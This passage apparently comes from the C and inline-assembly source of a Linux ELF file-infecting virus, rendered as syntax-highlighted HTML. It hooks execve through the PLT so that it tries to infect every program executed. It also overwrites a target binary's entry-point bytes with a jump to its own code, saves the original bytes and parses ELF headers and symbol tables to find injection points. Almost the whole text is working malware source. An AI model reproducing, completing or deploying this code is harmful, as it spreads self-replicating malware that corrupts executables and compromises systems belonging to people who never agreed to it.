#define TEMPNAME    4
#define EXECVE      12
#define SEC_STRING  19
#define REL_PLT     26
#define DOT     35
#define INIT        37
</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">getdataseg</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">__asm__</span><span class="sc10">(</span><span class="sc12">"
</span><span class="sc0">    </span><span class="sc11">call</span><span class="sc0"> </span><span class="sc11">datasegreloc</span><span class="sc0">
</span><span class="sc11">datasegreloc</span><span class="sc10">:</span><span class="sc0">
    </span><span class="sc11">popl</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc11">eax</span><span class="sc0">
    </span><span class="sc11">addl</span><span class="sc0"> </span><span class="sc11">$</span><span class="sc10">(</span><span class="sc11">dataseg</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">datasegreloc</span><span class="sc10">),%</span><span class="sc11">eax</span><span class="sc0">
    </span><span class="sc11">jmp</span><span class="sc0"> </span><span class="sc11">skipdataseg</span><span class="sc0">
</span><span class="sc11">dataseg</span><span class="sc10">:</span><span class="sc0">
</span><span class="sc10">.</span><span class="sc16">long</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0">
</span><span class="sc10">.</span><span class="sc11">string</span><span class="sc0"> \</span><span class="sc12">"vXXXXXX\"
</span><span class="sc10">.</span><span class="sc11">string</span><span class="sc0"> \</span><span class="sc12">"execve\"
</span><span class="sc10">.</span><span class="sc11">string</span><span class="sc0"> \</span><span class="sc12">".data1\"
</span><span class="sc10">.</span><span class="sc11">string</span><span class="sc0"> \</span><span class="sc12">".rel.plt\"
</span><span class="sc10">.</span><span class="sc11">string</span><span class="sc0"> \</span><span class="sc12">".\"
</span><span class="sc10">.</span><span class="sc11">string</span><span class="sc0"> \</span><span class="sc12">"/sbin/init\"
</span><span class="sc11">skipdataseg</span><span class="sc10">:</span><span class="sc0">
</span><span class="sc12">");
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc1">/*
    this can be coded in asm but should we? (though its faster and smaller)
*/</span><span class="sc0">

</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">orig_plt_func</span><span class="sc10">(</span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">filename</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">argv</span><span class="sc10">[],</span><span class="sc0"> </span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">envp</span><span class="sc10">[])</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">data</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">getvirdata</span><span class="sc10">();</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc10">(*</span><span class="sc11">f</span><span class="sc10">)(</span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*,</span><span class="sc0"> </span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*[],</span><span class="sc0"> </span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*[]);</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">ret</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">f</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc10">*)(*(</span><span class="sc16">long</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">data</span><span class="sc10">[</span><span class="sc11">PLT_ADDR</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">data</span><span class="sc10">[</span><span class="sc11">ORIG_PLT_ADDR</span><span class="sc10">]);</span><span class="sc0">
    </span><span class="sc11">ret</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">f</span><span class="sc10">(</span><span class="sc11">filename</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">argv</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">envp</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc1">/*  data[ORIG_PLT_ADDR] = *(long *)data[PLT_ADDR];

    the following line doesnt compile very nicely as it doesnt shortcut
    the subtraction

    *(long *)data[PLT_ADDR] = (long)&amp;((char *)data)[
        (long)plt_execve - (long)virdata
    ];
*/</span><span class="sc0">  </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">ret</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">plt_execve</span><span class="sc10">(</span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">filename</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">argv</span><span class="sc10">[],</span><span class="sc0"> </span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">envp</span><span class="sc10">[])</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">try_infect</span><span class="sc10">(</span><span class="sc11">filename</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">orig_plt_func</span><span class="sc10">(</span><span class="sc11">filename</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">argv</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">envp</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">virchfunc</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">__asm__</span><span class="sc10">(</span><span class="sc12">"
</span><span class="sc10">.</span><span class="sc11">globl</span><span class="sc0"> </span><span class="sc11">virchstart</span><span class="sc0">
    </span><span class="sc10">.</span><span class="sc11">type</span><span class="sc0"> </span><span class="sc11">virchstart</span><span class="sc10">,</span><span class="sc11">@function</span><span class="sc0">
</span><span class="sc11">virchstart</span><span class="sc10">:</span><span class="sc0">
    </span><span class="sc11">call</span><span class="sc0"> </span><span class="sc11">virchmain</span><span class="sc0">
</span><span class="sc11">virchmain</span><span class="sc10">:</span><span class="sc0">
    </span><span class="sc11">popl</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc11">esi</span><span class="sc0">               #
    </span><span class="sc11">addl</span><span class="sc0"> </span><span class="sc11">$</span><span class="sc10">(</span><span class="sc11">virchdata</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">virchmain</span><span class="sc10">),%</span><span class="sc11">esi</span><span class="sc0">  # </span><span class="sc11">movl</span><span class="sc0"> </span><span class="sc11">$virdata</span><span class="sc10">,%</span><span class="sc11">esi</span><span class="sc0">

    </span><span class="sc11">movl</span><span class="sc0"> </span><span class="sc11">data_entry_point</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">virchdata</span><span class="sc10">(%</span><span class="sc11">esi</span><span class="sc10">),%</span><span class="sc11">edi</span><span class="sc0">
                        </span><span class="sc9"># movl data_entry_point,%edi
</span><span class="sc0">    </span><span class="sc11">jmp</span><span class="sc0"> </span><span class="sc10">*%</span><span class="sc11">edi</span><span class="sc0">

</span><span class="sc10">.</span><span class="sc11">globl</span><span class="sc0"> </span><span class="sc11">getvirchdata</span><span class="sc0">
    </span><span class="sc10">.</span><span class="sc11">type</span><span class="sc0"> </span><span class="sc11">getvirchdata</span><span class="sc10">,</span><span class="sc11">@function</span><span class="sc0">
</span><span class="sc11">getvirchdata</span><span class="sc10">:</span><span class="sc0">

    </span><span class="sc11">pushl</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc11">ebp</span><span class="sc0">
    </span><span class="sc11">movl</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc11">esp</span><span class="sc10">,%</span><span class="sc11">ebp</span><span class="sc0">

    </span><span class="sc11">call</span><span class="sc0"> </span><span class="sc11">virchreloc</span><span class="sc0">
</span><span class="sc11">virchreloc</span><span class="sc10">:</span><span class="sc0">
    </span><span class="sc11">popl</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc11">eax</span><span class="sc0">
    </span><span class="sc11">addl</span><span class="sc0"> </span><span class="sc11">$</span><span class="sc10">(</span><span class="sc11">virchdata</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">virchreloc</span><span class="sc10">),%</span><span class="sc11">eax</span><span class="sc0">

    </span><span class="sc11">movl</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc11">ebp</span><span class="sc10">,%</span><span class="sc11">esp</span><span class="sc0">  
    </span><span class="sc11">popl</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc11">ebp</span><span class="sc0">
    </span><span class="sc11">ret</span><span class="sc0">

</span><span class="sc11">virchdata</span><span class="sc10">:</span><span class="sc0">

</span><span class="sc10">.</span><span class="sc11">globl</span><span class="sc0"> </span><span class="sc11">data_entry_point</span><span class="sc0">
    </span><span class="sc10">.</span><span class="sc11">size</span><span class="sc0"> </span><span class="sc11">data_entry_point</span><span class="sc10">,</span><span class="sc4">4</span><span class="sc0">
    </span><span class="sc10">.</span><span class="sc11">type</span><span class="sc0"> </span><span class="sc11">data_entry_point</span><span class="sc10">,</span><span class="sc11">@object</span><span class="sc0">
</span><span class="sc11">data_entry_point</span><span class="sc10">:</span><span class="sc0">
</span><span class="sc10">.</span><span class="sc16">long</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0">

</span><span class="sc10">.</span><span class="sc11">globl</span><span class="sc0"> </span><span class="sc11">virchend</span><span class="sc0">
    </span><span class="sc10">.</span><span class="sc11">type</span><span class="sc0"> </span><span class="sc11">virchend</span><span class="sc10">,</span><span class="sc11">@function</span><span class="sc0">
</span><span class="sc11">virchend</span><span class="sc10">:</span><span class="sc0">
</span><span class="sc12">");
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">get_virus</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*)((</span><span class="sc16">long</span><span class="sc10">)</span><span class="sc11">getvirdata</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">130</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">_memcpy</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">dst</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">src</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">len</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">p</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">q</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">p</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">src</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">q</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">dst</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">len</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">q</span><span class="sc10">++</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">p</span><span class="sc10">++;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">_strcmp</span><span class="sc10">(</span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">p</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">q</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(*</span><span class="sc11">p</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">q</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(*</span><span class="sc11">p</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">q</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">++</span><span class="sc11">p</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">++</span><span class="sc11">q</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">p</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">q</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">init_virus</span><span class="sc10">(</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">plt</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">data_start</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">data_memsz</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">entry</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">bin_t</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">bin</span><span class="sc0">
</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc11">code_start</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">data_start</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">data_memsz</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">chdata</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">data</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc11">_virchstart</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">chdata</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">getvirchdata</span><span class="sc10">();</span><span class="sc0">
    </span><span class="sc11">_virchstart</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">long</span><span class="sc10">)</span><span class="sc11">chdata</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">38</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">chdata</span><span class="sc10">[</span><span class="sc11">DATA_ENTRY_POINT</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">code_start</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">data</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">getvirdata</span><span class="sc10">();</span><span class="sc0">
    </span><span class="sc11">data</span><span class="sc10">[</span><span class="sc11">ORIG_ENTRY_POINT</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">entry</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">plt</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">data</span><span class="sc10">[</span><span class="sc11">USE_PLT</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">data</span><span class="sc10">[</span><span class="sc11">USE_PLT</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">data</span><span class="sc10">[</span><span class="sc11">PLT_ADDR</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">plt</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">bin</span><span class="sc10">-&gt;</span><span class="sc11">bss</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc11">vaddr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">bin</span><span class="sc10">-&gt;</span><span class="sc11">shdr</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">sh_addr</span><span class="sc10">;</span><span class="sc0">

        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">entry</span><span class="sc0"> </span><span class="sc10">&gt;=</span><span class="sc0"> </span><span class="sc11">vaddr</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">entry</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">vaddr</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">bin</span><span class="sc10">-&gt;</span><span class="sc11">shdr</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">sh_size</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">p</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">bin</span><span class="sc10">-&gt;</span><span class="sc11">section</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">][</span><span class="sc11">entry</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">vaddr</span><span class="sc10">];</span><span class="sc0">

            </span><span class="sc11">_memcpy</span><span class="sc10">(&amp;</span><span class="sc11">data</span><span class="sc10">[</span><span class="sc11">STORE</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc11">p</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">CHAIN_LENGTH</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">_memcpy</span><span class="sc10">(</span><span class="sc11">p</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">_virchstart</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">CHAIN_LENGTH</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">do_elf_checks</span><span class="sc10">(</span><span class="sc11">Elf32_Ehdr</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">ehdr</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc0">
        </span><span class="sc11">ehdr</span><span class="sc10">-&gt;</span><span class="sc11">e_ident</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">ELFMAG0</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0">
        </span><span class="sc11">ehdr</span><span class="sc10">-&gt;</span><span class="sc11">e_ident</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">ELFMAG1</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0">
        </span><span class="sc11">ehdr</span><span class="sc10">-&gt;</span><span class="sc11">e_ident</span><span class="sc10">[</span><span class="sc4">2</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">ELFMAG2</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0">
        </span><span class="sc11">ehdr</span><span class="sc10">-&gt;</span><span class="sc11">e_ident</span><span class="sc10">[</span><span class="sc4">3</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">ELFMAG3</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0">
        </span><span class="sc11">ehdr</span><span class="sc10">-&gt;</span><span class="sc11">e_type</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">ET_EXEC</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0">
        </span><span class="sc10">(</span><span class="sc11">ehdr</span><span class="sc10">-&gt;</span><span class="sc11">e_machine</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">EM_386</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">ehdr</span><span class="sc10">-&gt;</span><span class="sc11">e_machine</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">EM_486</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0">
        </span><span class="sc11">ehdr</span><span class="sc10">-&gt;</span><span class="sc11">e_version</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">EV_CURRENT</span><span class="sc0">
    </span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0"> 


</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">do_dyn_symtab</span><span class="sc10">(</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc11">Elf32_Shdr</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">shdr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">Elf32_Shdr</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">shdrp</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">sh_function</span><span class="sc0">
</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">Elf32_Shdr</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">strtabhdr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">shdr</span><span class="sc10">[</span><span class="sc11">shdrp</span><span class="sc10">-&gt;</span><span class="sc11">sh_link</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">string</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">Elf32_Sym</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">sym</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">symp</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">string</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">_malloc</span><span class="sc10">(</span><span class="sc11">strtabhdr</span><span class="sc10">-&gt;</span><span class="sc11">sh_size</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">string</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">error</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">_lseek</span><span class="sc10">(</span><span class="sc0">
        </span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">strtabhdr</span><span class="sc10">-&gt;</span><span class="sc11">sh_offset</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SEEK_SET</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">strtabhdr</span><span class="sc10">-&gt;</span><span class="sc11">sh_offset</span><span class="sc0">
    </span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">string_error</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">_read</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">string</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">strtabhdr</span><span class="sc10">-&gt;</span><span class="sc11">sh_size</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">strtabhdr</span><span class="sc10">-&gt;</span><span class="sc11">sh_size</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">string_error</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">sym</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Elf32_Sym</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">_malloc</span><span class="sc10">(</span><span class="sc11">shdrp</span><span class="sc10">-&gt;</span><span class="sc11">sh_size</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sym</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">string_error</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">_lseek</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">shdrp</span><span class="sc10">-&gt;</span><span class="sc11">sh_offset</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SEEK_SET</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">shdrp</span><span class="sc10">-&gt;</span><span class="sc11">sh_offset</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">sym_error</span><span class="sc10">;</span><span class="sc0">
